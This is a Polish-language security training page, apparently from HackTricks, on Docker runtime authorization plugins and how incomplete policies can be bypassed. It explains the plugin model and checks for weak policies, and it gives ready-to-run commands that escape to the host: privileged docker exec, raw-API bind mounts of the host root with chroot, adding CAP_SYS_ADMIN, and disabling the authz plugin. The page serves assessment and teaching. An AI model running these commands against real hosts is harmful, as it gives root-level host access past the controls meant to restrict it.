# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Runtime authorization plugins to dodatkowa warstwa policy, która decyduje, czy caller może wykonać daną akcję daemona. Docker jest klasycznym przykładem. Domyślnie każdy, kto może komunikować się z Docker daemonem, ma w praktyce szeroką kontrolę nad nim. Authorization plugins próbują zawęzić ten model, analizując tożsamość uwierzytelnionego użytkownika oraz żądaną operację API, a następnie zezwalając na request lub go odrzucając zgodnie z policy.

Ten temat zasługuje na osobną stronę, ponieważ zmienia model exploitation, gdy attacker ma już dostęp do Docker API lub do użytkownika w grupie `docker`. W takich środowiskach pytanie nie brzmi już tylko: „czy mogę dotrzeć do daemona?”, ale także: „czy daemon jest ograniczony przez warstwę authorization, a jeśli tak, czy można ominąć tę warstwę przez nieobsługiwane endpointy, słabe parsowanie JSON lub uprawnienia do zarządzania pluginami?”.

## Operation

Gdy request dociera do Docker daemona, authorization subsystem może przekazać context requestu do jednego lub kilku zainstalowanych pluginów. Plugin widzi tożsamość uwierzytelnionego użytkownika, szczegóły requestu, wybrane headery oraz części body requestu lub response, gdy content type jest odpowiedni. Można łączyć wiele pluginów, a dostęp jest przyznawany tylko wtedy, gdy wszystkie pluginy zezwolą na request.

Ten model brzmi solidnie, ale jego bezpieczeństwo zależy całkowicie od tego, jak dokładnie autor policy zrozumiał API. Plugin, który blokuje `docker run --privileged`, ale ignoruje `docker exec`, pomija alternatywne klucze JSON, takie jak najwyższego poziomu `Binds`, lub zezwala na administrację pluginami, może stworzyć fałszywe poczucie ograniczenia, nadal pozostawiając otwarte bezpośrednie ścieżki eskalacji uprawnień.

## Common Plugin Targets

Ważne obszary do przeglądu policy to:

- endpointy tworzenia kontenerów
- pola `HostConfig`, takie jak `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` oraz opcje współdzielenia namespace
- działanie `docker exec`
- endpointy zarządzania pluginami
- dowolny endpoint, który może pośrednio uruchamiać działania runtime poza zakładanym modelem policy

Historycznie przykłady takie jak plugin `authz` firmy Twistlock oraz proste pluginy edukacyjne, takie jak `authobot`, ułatwiały analizę tego modelu, ponieważ ich pliki policy i ścieżki kodu pokazywały, jak faktycznie implementowano mapowanie endpointów na akcje. W pracy assessmentowej najważniejsza lekcja jest taka, że autor policy musi rozumieć pełną powierzchnię API, a nie tylko najbardziej widoczne komendy CLI.

## Abuse

Pierwszym celem jest ustalenie, co faktycznie jest blokowane. Jeśli daemon odrzuca akcję, błąd często leak-uje nazwę pluginu, co pomaga zidentyfikować używany mechanizm kontroli:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Jeśli potrzebujesz szerszego profilowania endpointów, przydatne są narzędzia takie jak `docker_auth_profiler`, ponieważ automatyzują żmudne zadanie sprawdzania, które trasy API i struktury JSON są faktycznie dozwolone przez plugin.

Jeśli środowisko korzysta z niestandardowego pluginu i możesz wchodzić w interakcję z API, wylicz, które pola obiektów są faktycznie filtrowane:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Te kontrole mają znaczenie, ponieważ wiele błędów autoryzacji dotyczy konkretnych pól, a nie całych koncepcji. Plugin może odrzucać wzorzec CLI, nie blokując w pełni równoważnej struktury API.

### Pełny przykład: `docker exec` dodaje uprawnienia po utworzeniu kontenera

Polityka, która blokuje tworzenie uprzywilejowanych kontenerów, ale zezwala na tworzenie kontenerów unconfined oraz użycie `docker exec`, może nadal zostać ominięta:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Jeśli daemon zaakceptuje drugi krok, użytkownik odzyskał uprzywilejowany interaktywny proces wewnątrz kontenera, który — jak sądził autor polityki — był ograniczony.

### Pełny przykład: Bind Mount przez Raw API

Niektóre wadliwe polityki sprawdzają tylko jeden format JSON. Jeśli bind mount głównego systemu plików nie jest konsekwentnie blokowany, host nadal może zostać zamontowany:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Ta sama idea może również występować w `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Skutkiem jest pełne wydostanie się do systemu plików hosta. Istotny szczegół polega na tym, że obejście wynika z niepełnego pokrycia przez policy, a nie z błędu jądra.

### Pełny przykład: Niesprawdzany atrybut capability

Jeśli policy zapomni filtrować atrybutu powiązanego z capability, attacker może utworzyć container, który odzyska niebezpieczną capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Po uzyskaniu `CAP_SYS_ADMIN` lub podobnej silnej capability staje się możliwe zastosowanie wielu technik breakout opisanych w [capabilities.md](protections/capabilities.md) oraz [privileged-containers.md](privileged-containers.md).

### Pełny przykład: wyłączenie Pluginu

Jeśli operacje zarządzania pluginami są dozwolone, najczystszym obejściem może być całkowite wyłączenie mechanizmu:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Jest to błąd konfiguracji polityki na poziomie control-plane. Warstwa autoryzacji istnieje, ale użytkownik, którego miała ograniczać, nadal ma uprawnienia do jej wyłączenia.

## Kontrole

Te polecenia służą do ustalenia, czy istnieje warstwa polityki oraz czy wydaje się kompletna, czy tylko pozorna.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Co jest tutaj interesujące:

- Komunikaty odmowy zawierające nazwę pluginu potwierdzają obecność warstwy autoryzacji i często ujawniają dokładną implementację.
- Lista pluginów widoczna dla atakującego może wystarczyć do ustalenia, czy możliwe są operacje wyłączania lub rekonfiguracji.
- Politykę blokującą tylko oczywiste działania CLI, ale nie surowe żądania API, należy traktować jako podatną na obejście, dopóki nie zostanie udowodnione inaczej.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Typowe ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie nieaktywne | Dostęp do daemona jest zasadniczo typu all-or-nothing, chyba że skonfigurowano plugin autoryzacji | niekompletna polityka pluginu, blacklists zamiast allowlists, zezwalanie na zarządzanie pluginami, przeoczenia na poziomie pól |
| Podman | Brak typowego bezpośredniego odpowiednika | Podman zazwyczaj w większym stopniu opiera się na uprawnieniach Unix, wykonywaniu rootless i decyzjach dotyczących ekspozycji API niż na pluginach authz w stylu Dockera | szerokie udostępnienie rootful Podman API, słabe uprawnienia do socketu |
| containerd / CRI-O | Inny model kontroli | Te runtime'y zazwyczaj opierają się na uprawnieniach do socketu, granicach zaufania węzłów i kontrolach orkiestratora wyższej warstwy, a nie na pluginach authz Dockera | montowanie socketu w workloadach, słabe założenia dotyczące lokalnego zaufania węzła |
| Kubernetes | Wykorzystuje authn/authz na warstwach API-servera i kubeleta, a nie pluginy authz Dockera | Główną warstwą polityki są RBAC klastra i mechanizmy admission control | nadmiernie szerokie RBAC, słaba polityka admission, bezpośrednie udostępnianie API kubeleta lub runtime'u |
{{#include ../../../banners/hacktricks-training.md}}
